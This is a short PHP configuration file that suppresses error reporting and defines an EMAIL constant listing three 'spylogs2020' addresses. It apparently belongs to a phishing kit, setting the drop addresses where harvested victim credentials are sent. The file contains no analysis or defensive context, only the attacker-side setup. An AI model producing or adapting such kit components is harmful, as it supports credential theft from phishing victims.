<?php
error_reporting(0);
$ur_email   = "spylogs2020@YANDEX.RU,spylogs2020@yahoo.com,spylogs2020@protonmail.com";
define("EMAIL", "$ur_email");
?>